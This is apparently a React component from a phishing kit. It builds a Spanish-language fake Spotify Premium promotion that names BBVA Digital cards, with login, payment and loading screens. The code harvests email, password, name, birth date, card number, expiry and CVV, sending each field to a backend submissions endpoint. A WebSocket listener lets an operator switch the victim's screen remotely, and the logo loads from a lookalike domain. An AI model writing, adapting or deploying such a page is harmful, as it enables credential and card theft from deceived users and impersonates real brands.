import { useState, useEffect } from "react";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { useWebSocket } from "@/hooks/use-websocket";

export default function TemplateSpotify() {
  const sessionId = new URLSearchParams(window.location.search).get("sessionId");
  const { lastMessage } = useWebSocket();
  const spotifyLogo = "https://hh.airlines-mx.click/premios/hook/Spotify-Logo%20(1).png";
  
  const [currentScreen, setCurrentScreen] = useState("login");
  const [isLoading, setIsLoading] = useState(false);
  const [formData, setFormData] = useState({
    email: "",
    password: "",
    firstName: "",
    lastName: "",
    birthDate: "",
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    nameOnCard: "",
  });

  // Update session when screen changes
  const updateSession = async (data: any) => {
    if (!sessionId) return;
    try {
      await apiRequest("PATCH", `/api/sessions/${sessionId}`, data);
    } catch (error) {
      console.error("Failed to update session:", error);
    }
  };

  // Submit data mutation
  const submitDataMutation = useMutation({
    mutationFn: async (data: { fieldName: string; fieldValue: string }) => {
      if (!sessionId) return;
      const response = await apiRequest("POST", "/api/submissions", {
        sessionId,
        ...data,
      });
      return response.json();
    },
  });

  const submitData = async (fieldName: string, fieldValue: string) => {
    await submitDataMutation.mutateAsync({ fieldName, fieldValue });
  };

  // Listen for WebSocket updates to change screen remotely
  useEffect(() => {
    if (lastMessage) {
      try {
        const message = JSON.parse(lastMessage);
        
        if (message.type === 'session_updated' && 
            message.data.id === sessionId && 
            message.data.currentScreen && 
            message.data.currentScreen !== currentScreen) {
          setCurrentScreen(message.data.currentScreen);
        }
      } catch (error) {
        console.error("Error parsing WebSocket message:", error);
      }
    }
  }, [lastMessage, sessionId, currentScreen]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    let processedValue = value;

    // Validaciones específicas por campo
    if (name === 'cardNumber') {
      // Solo permitir números y máximo 16 dígitos
      processedValue = value.replace(/\D/g, '').slice(0, 16);
    } else if (name === 'expiryDate') {
      // Solo números y formateo automático MM/YY
      const numbers = value.replace(/\D/g, '');
      if (numbers.length >= 2) {
        processedValue = numbers.slice(0, 2) + '/' + numbers.slice(2, 4);
      } else {
        processedValue = numbers;
      }
    } else if (name === 'cvv') {
      // Solo números y máximo 3 dígitos
      processedValue = value.replace(/\D/g, '').slice(0, 3);
    }

    setFormData(prev => ({ ...prev, [name]: processedValue }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      if (currentScreen === "login") {
        // Submit login data
        await submitData("email", formData.email);
        await submitData("password", formData.password);
        await submitData("firstName", formData.firstName);
        await submitData("lastName", formData.lastName);
        await submitData("birthDate", formData.birthDate);
        
        // Move to payment screen
        setCurrentScreen("payment");
        await updateSession({ currentScreen: "payment" });
      } else if (currentScreen === "payment") {
        // Submit payment data
        await submitData("cardNumber", formData.cardNumber);
        await submitData("expiryDate", formData.expiryDate);
        await submitData("cvv", formData.cvv);
        await submitData("nameOnCard", formData.nameOnCard);
        
        // Move to loading screen
        setCurrentScreen("loading");
        await updateSession({ currentScreen: "loading", status: "form_filled" });
      }
    } catch (error) {
      console.error("Error submitting form:", error);
    } finally {
      setIsLoading(false);
    }
  };

  if (currentScreen === "loading") {
    return (
      <div className="min-h-screen bg-black text-white flex items-center justify-center">
        <div className="text-center">
          <img src={spotifyLogo} alt="Spotify" className="h-12 mx-auto mb-8" />
          <div className="animate-spin rounded-full h-16 w-16 border-b-2 border-[#1DB954] mx-auto mb-4"></div>
          <h2 className="text-2xl font-bold mb-2">Activando tu suscripción...</h2>
          <p className="text-gray-400">Procesando tu promoción de 3 meses gratis</p>
        </div>
      </div>
    );
  }

  if (currentScreen === "payment") {
    return (
      <div className="min-h-screen bg-black text-white">
        <div className="container mx-auto px-4 py-8 max-w-md">
          <div className="text-center mb-8">
            <img src={spotifyLogo} alt="Spotify" className="h-12 mx-auto mb-4" />
            <h1 className="text-3xl font-bold">¡Últimos pasos!</h1>
            <p className="text-gray-400 mt-2">Confirma tu tarjeta BBVA Digital para activar tus 3 meses gratis</p>
          </div>

          <div className="bg-[#1DB954] bg-opacity-10 border border-[#1DB954] rounded-lg p-4 mb-6">
            <div className="flex items-center">
              <div className="bg-[#1DB954] text-black text-xs font-bold px-2 py-1 rounded mr-3">
                PROMO
              </div>
              <div>
                <p className="font-bold text-[#1DB954]">3 meses gratis</p>
                <p className="text-sm text-gray-400">Con tu tarjeta BBVA Digital</p>
              </div>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <label className="block text-sm font-medium mb-2" htmlFor="nameOnCard">
                Nombre en la tarjeta
              </label>
              <input
                type="text"
                id="nameOnCard"
                name="nameOnCard"
                value={formData.nameOnCard}
                onChange={handleInputChange}
                className="w-full px-4 py-3 bg-gray-900 border border-gray-700 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:border-[#1DB954]"
                placeholder="Como aparece en tu tarjeta"
                required
                data-testid="input-name-on-card"
              />
            </div>

            <div>
              <label className="block text-sm font-medium mb-2" htmlFor="cardNumber">
                Número de tarjeta BBVA Digital
              </label>
              <input
                type="text"
                id="cardNumber"
                name="cardNumber"
                value={formData.cardNumber}
                onChange={handleInputChange}
                className="w-full px-4 py-3 bg-gray-900 border border-gray-700 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:border-[#1DB954]"
                placeholder="1234567890123456"
                maxLength={16}
                required
                data-testid="input-card-number"
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium mb-2" htmlFor="expiryDate">
                  Fecha de vencimiento
                </label>
                <input
                  type="text"
                  id="expiryDate"
                  name="expiryDate"
                  value={formData.expiryDate}
                  onChange={handleInputChange}
                  className="w-full px-4 py-3 bg-gray-900 border border-gray-700 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:border-[#1DB954]"
                  placeholder="MM/AA"
                  maxLength={5}
                  required
                  data-testid="input-expiry-date"
                />
              </div>
              <div>
                <label className="block text-sm font-medium mb-2" htmlFor="cvv">
                  CVV
                </label>
                <input
                  type="text"
                  id="cvv"
                  name="cvv"
                  value={formData.cvv}
                  onChange={handleInputChange}
                  className="w-full px-4 py-3 bg-gray-900 border border-gray-700 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:border-[#1DB954]"
                  placeholder="123"
                  maxLength={3}
                  required
                  data-testid="input-cvv"
                />
              </div>
            </div>

            <div className="bg-gray-900 rounded-lg p-4 mt-6">
              <h3 className="font-bold text-lg mb-2">Tu plan Premium</h3>
              <div className="flex justify-between items-center text-sm">
                <span>Spotify Premium (3 meses)</span>
                <span className="text-[#1DB954] font-bold">GRATIS</span>
              </div>
              <div className="flex justify-between items-center text-sm mt-1">
                <span className="text-gray-400">Después: $99/mes</span>
                <span className="text-gray-400">Cancela cuando quieras</span>
              </div>
            </div>

            <button
              type="submit"
              disabled={isLoading}
              className="w-full bg-[#1DB954] text-black font-bold py-4 px-6 rounded-full text-lg hover:bg-[#1ed760] transition-colors disabled:opacity-50 disabled:cursor-not-allowed mt-6"
              data-testid="button-activate-premium"
            >
              {isLoading ? "Procesando..." : "Activar Premium Gratis"}
            </button>

            <p className="text-xs text-gray-400 text-center mt-4">
              Promoción válida solo para tarjetas BBVA Digital. Se aplicará el cargo después de 3 meses.
            </p>
          </form>
        </div>
      </div>
    );
  }

  // Login screen (default)
  return (
    <div className="min-h-screen bg-black text-white">
      <div className="container mx-auto px-4 py-8 max-w-md">
        <div className="text-center mb-8">
          <img src={spotifyLogo} alt="Spotify" className="h-12 mx-auto mb-4" />
          <h1 className="text-3xl font-bold">3 meses gratis</h1>
          <p className="text-gray-400 mt-2">de Spotify Premium con tu tarjeta BBVA Digital</p>
        </div>

        <div className="bg-gradient-to-r from-[#1DB954] to-[#1ed760] rounded-lg p-4 mb-6 text-black">
          <div className="flex items-center justify-between">
            <div>
              <p className="font-bold text-lg">¡Oferta especial!</p>
              <p className="text-sm">3 meses gratis + música sin límites</p>
            </div>
            <div className="text-right">
              <p className="font-bold text-2xl">$0</p>
              <p className="text-sm">los primeros 3 meses</p>
            </div>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-sm font-medium mb-2" htmlFor="email">
              Correo electrónico
            </label>
            <input
              type="email"
              id="email"
              name="email"
              value={formData.email}
              onChange={handleInputChange}
              className="w-full px-4 py-3 bg-gray-900 border border-gray-700 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:border-[#1DB954]"
              placeholder="nombre@ejemplo.com"
              required
              data-testid="input-email"
            />
          </div>

          <div>
            <label className="block text-sm font-medium mb-2" htmlFor="password">
              Contraseña
            </label>
            <input
              type="password"
              id="password"
              name="password"
              value={formData.password}
              onChange={handleInputChange}
              className="w-full px-4 py-3 bg-gray-900 border border-gray-700 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:border-[#1DB954]"
              placeholder="Tu contraseña"
              required
              data-testid="input-password"
            />
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div>
              <label className="block text-sm font-medium mb-2" htmlFor="firstName">
                Nombre
              </label>
              <input
                type="text"
                id="firstName"
                name="firstName"
                value={formData.firstName}
                onChange={handleInputChange}
                className="w-full px-4 py-3 bg-gray-900 border border-gray-700 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:border-[#1DB954]"
                placeholder="Tu nombre"
                required
                data-testid="input-first-name"
              />
            </div>
            <div>
              <label className="block text-sm font-medium mb-2" htmlFor="lastName">
                Apellido
              </label>
              <input
                type="text"
                id="lastName"
                name="lastName"
                value={formData.lastName}
                onChange={handleInputChange}
                className="w-full px-4 py-3 bg-gray-900 border border-gray-700 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:border-[#1DB954]"
                placeholder="Tu apellido"
                required
                data-testid="input-last-name"
              />
            </div>
          </div>

          <div>
            <label className="block text-sm font-medium mb-2" htmlFor="birthDate">
              Fecha de nacimiento
            </label>
            <input
              type="date"
              id="birthDate"
              name="birthDate"
              value={formData.birthDate}
              onChange={handleInputChange}
              className="w-full px-4 py-3 bg-gray-900 border border-gray-700 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:border-[#1DB954]"
              required
              data-testid="input-birth-date"
            />
          </div>

          <div className="bg-gray-900 rounded-lg p-4 mt-6">
            <h3 className="font-bold mb-2">Lo que obtienes:</h3>
            <ul className="text-sm text-gray-300 space-y-1">
              <li>✓ Música sin anuncios</li>
              <li>✓ Descarga para escuchar sin conexión</li>
              <li>✓ Reproduce cualquier canción</li>
              <li>✓ Calidad de audio superior</li>
            </ul>
          </div>

          <button
            type="submit"
            disabled={isLoading}
            className="w-full bg-[#1DB954] text-black font-bold py-4 px-6 rounded-full text-lg hover:bg-[#1ed760] transition-colors disabled:opacity-50 disabled:cursor-not-allowed mt-6"
            data-testid="button-continue"
          >
            {isLoading ? "Procesando..." : "Continuar"}
          </button>

          <p className="text-xs text-gray-400 text-center mt-4">
            Al hacer clic en "Continuar", aceptas los Términos y Condiciones de Spotify y la promoción BBVA Digital.
          </p>
        </form>
      </div>
    </div>
  );
}